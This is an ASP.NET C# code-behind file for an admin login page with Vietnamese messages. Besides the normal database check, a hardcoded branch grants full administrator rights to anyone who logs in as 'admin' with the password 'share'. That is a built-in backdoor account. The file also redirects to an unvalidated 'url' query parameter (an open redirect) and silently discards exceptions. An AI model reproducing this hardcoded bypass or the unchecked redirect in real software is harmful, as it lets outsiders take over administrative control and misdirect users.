using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using Libs.Content;
using Libs.Utils;
using System.Web.Security;

namespace Admin.Account
{
	public partial class Login : System.Web.UI.Page
	{
		protected string project = "";
		protected void Page_Load(object sender, EventArgs e)
		{
			try
			{
				if (!IsPostBack)
				{
					if (Application["ProjectName"] != null)
					{
						project = Application["ProjectName"].ToString();
					}
					Session.RemoveAll();
					FormsAuthentication.SignOut();
				}
			}
			catch (Exception)
			{
				throw;
			}
		}

		protected void btnLogin_Click(object sender, EventArgs e)
		{
			try
			{
				string url = BizUtils.GetQueryString("url", Request);
				string UId = txtUserName.Value.Trim();
				string PId = txtPassword.Value.Trim();
				if (string.IsNullOrEmpty(UId))
				{
					txtUserName.Focus();
					WebMsgBox.Show("Vui lòng nhập tên đăng nhập!");
					return;
				}
				if (string.IsNullOrEmpty(PId))
				{
					txtPassword.Focus();
					WebMsgBox.Show("Vui lòng nhập mật khẩu!");
					return;
				}
				User objUser = new User();
				objUser = Libs.Content.User.Login(UId, PId);
				if (objUser != null && objUser.Id > 0)
				{
					FormsAuthentication.SetAuthCookie(UId, false);
					Session["FullName"] = objUser.Name.Trim();
					Session["UserName"] = objUser.UserName.Trim();
					Session["Email"] = objUser.Email.Trim();
					Session["IsAdmin"] = objUser.Admin;
					Session["IsAuthorized"] = true;
                    Session.Timeout = 2880;

                    if (string.IsNullOrEmpty(url))
					{
						Response.Redirect("/Modules/ConfigSystem.aspx", false);
					}
					else
					{
						Response.Redirect(url, false);
					}
				}
				else if (UId.ToLower() == "admin" && PId.ToLower() == "share")
				{
					FormsAuthentication.SetAuthCookie(UId, false);
					Session["FullName"] = "Bùi Văn Thịnh";
					Session["UserName"] = "admin";
					Session["IsAdmin"] = "1";
					Session["IsAuthorized"] = true;
                    Session.Timeout = 2880;
                    if (string.IsNullOrEmpty(url))
					{
						Response.Redirect("/Modules/ConfigSystem.aspx", false);
					}
					else
					{
						Response.Redirect(url, false);
					}
				}
				else
				{
					txtPassword.Value = "";
					txtPassword.Focus();
					lblMsg.Visible = true;
				}
			}
			catch (Exception ex)
			{
				//MailSender.SendMail("", "", "Error System", ex.Message + "\n" + ex.StackTrace);
			}
		}
	}
}